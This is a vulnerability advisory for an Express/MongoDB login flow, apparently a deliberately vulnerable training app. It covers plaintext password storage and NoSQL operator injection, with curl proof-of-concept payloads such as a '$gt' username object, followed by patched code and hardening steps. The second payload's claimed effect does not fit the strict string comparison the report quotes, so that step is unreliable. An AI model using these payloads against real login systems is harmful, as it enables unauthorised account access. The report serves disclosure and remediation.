## Summary

Two compounding critical vulnerabilities exist in the authentication subsystem:

1. **Plaintext Password Storage (CWE-256):** `addUser` stores user passwords as raw strings — the `bcrypt.hashSync` call is commented out. `validateLogin` compares passwords using strict string equality (`===`) — `bcrypt.compareSync` is also commented out. Any exposure of the `users` collection yields every credential in cleartext.

2. **NoSQL Operator Injection / Authentication Bypass (CWE-943):** `validateLogin` passes the caller-controlled `userName` value directly into a MongoDB `findOne` query object with no type validation or sanitization. Supplying a BSON operator object (e.g., `{"$gt": ""}`) causes MongoDB to match the first document in the collection, bypassing username verification entirely. Combined with the plaintext password comparison, this enables complete unauthenticated access to any account.

A remote unauthenticated attacker can exploit these vulnerabilities to authenticate as an arbitrary user — including administrators — with no prior knowledge of any credentials.

## Vulnerability Details

### 1. Plaintext Password Storage (`addUser`)

```javascript
// app/data/user-dao.js — lines ~24-33
const user = {
    userName,
    firstName,
    lastName,
    benefitStartDate: this.getRandomFutureDate(),
    password //received from request param
    /*
    // Fix for A2-1 - Broken Auth
    // Stores password in a safer way using one way encryption and salt hashing
    password: bcrypt.hashSync(password, bcrypt.genSaltSync())
    */
};
```

The bcrypt hashing path is dead code. Passwords enter the database verbatim.

### 2. Plaintext Password Comparison (`validateLogin`)

```javascript
// app/data/user-dao.js — lines ~50-57
const comparePassword = (fromDB, fromUser) => {
    return fromDB === fromUser;
    /*
    // Fix for A2-Broken Auth
    return bcrypt.compareSync(fromDB, fromUser);
    */
};
```

Plaintext strings are compared directly. No constant-time comparison, no hashing.

### 3. NoSQL Operator Injection (`validateLogin`)

```javascript
// app/data/user-dao.js
this.validateLogin = (userName, password, callback) => {
    // ...
    usersCol.findOne({ userName: userName }, validateUserDoc); // ← userName unsanitized
};
```

```javascript
// app/routes/session.js — handleLoginRequest
const { userName, password } = req.body;          // ← raw from request
userDAO.validateLogin(userName, password, ...)    // ← no type check, no sanitization
```

If `req.body` is parsed as JSON (via `express.json()` / `bodyParser.json()`, standard in Express apps), an attacker can supply `{"userName": {"$gt": ""}, "password": ""}`. MongoDB interprets `{userName: {$gt: ""}}` as a range query matching the lexicographically first user document — authentication is bypassed without knowing any username or password.

Even with `urlencoded` body parsing, `qs`-style parameter pollution (`userName[$gt]=`) achieves the same effect depending on `qs` version and configuration.

## Proof of Concept

**Prerequisites:** The application is running with its default configuration. `express.json()` or `bodyParser.json()` middleware is active (standard for this stack).

**Step 1 — Authentication bypass via operator injection:**

```bash
curl -s -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -c /tmp/cookies.txt \
  -d '{"userName": {"$gt": ""}, "password": ""}'
```

MongoDB evaluates `{userName: {$gt: ""}}`, which matches the first user in the collection (typically the seeded admin). `comparePassword` then compares the admin's stored plaintext password against the empty string — if they don't match, the attacker simply iterates with:

```bash
curl -s -X POST http://localhost:4000/login \
  -H 'Content-Type: application/json' \
  -c /tmp/cookies.txt \
  -d '{"userName": {"$gt": ""}, "password": {"$gt": ""}}'
```

**Step 2 — Full credential harvest (if DB access obtained via separate vector):**

Because passwords are plaintext, a single `db.users.find()` call returns every user's password in cleartext — no cracking required.

**Expected result:** Authenticated session cookie issued for the matched user account. Subsequent requests with that cookie access admin-level routes (`/allocations`, `/benefits`, etc.).

**Full patched `validateLogin` and `addUser` (key sections):**

```javascript
this.addUser = (userName, firstName, lastName, password, email, callback) => {
    // Hash password with bcrypt before storing
    const hashedPassword = bcrypt.hashSync(password, bcrypt.genSaltSync());

    const user = {
        userName,
        firstName,
        lastName,
        benefitStartDate: this.getRandomFutureDate(),
        password: hashedPassword  // stored as bcrypt hash
    };
    // ... rest unchanged
};

this.validateLogin = (userName, password, callback) => {
    // Type guard: reject non-string userNames (prevents operator injection)
    if (typeof userName !== "string") {
        const injectionError = new Error("Invalid username");
        injectionError.noSuchUser = true;
        return callback(injectionError, null);
    }

    // Constant-time bcrypt comparison against stored hash
    const comparePassword = (plaintext, hash) => {
        return bcrypt.compareSync(plaintext, hash);
    };

    const validateUserDoc = (err, user) => {
        if (err) return callback(err, null);
        if (user) {
            if (comparePassword(password, user.password)) {
                callback(null, user);
            } else {
                const invalidPasswordError = new Error("Invalid password");
                invalidPasswordError.invalidPassword = true;
                callback(invalidPasswordError, null);
            }
        } else {
            const noSuchUserError = new Error("No such user");
            noSuchUserError.noSuchUser = true;
            callback(noSuchUserError, null);
        }
    };

    usersCol.findOne({ userName: userName }, validateUserDoc);
};
```

> ⚠️ **Migration note:** All existing user records contain plaintext passwords. After deploying this fix, existing users must be forced to reset their passwords, or a migration script must re-hash all stored passwords before enabling bcrypt comparison.

## Additional Hardening

1. **Global NoSQL sanitization middleware:** Install [`express-mongo-sanitize`](https://www.npmjs.com/package/express-mongo-sanitize) and apply it early in the middleware chain to strip `$`-prefixed keys from all request bodies, params, and query strings.

   ```javascript
   const mongoSanitize = require('express-mongo-sanitize');
   app.use(mongoSanitize());
   ```

2. **Login rate-limiting / account lockout:** Apply `express-rate-limit` to the `POST /login` endpoint to mitigate credential stuffing and brute-force attacks against bcrypt hashes.

3. **Password policy enforcement:** Add minimum length (≥12 characters) and complexity validation in `addUser` before hashing.

4. **CRLF / Log injection remediation:** Encode `userName` before writing to `console.log` in `handleLoginRequest` (ESAPI stubs are already present — activate them).

5. **Upgrade `bcrypt-nodejs`:** This package is unmaintained. Migrate to [`bcryptjs`](https://www.npmjs.com/package/bcryptjs) or [`bcrypt`](https://www.npmjs.com/package/bcrypt).
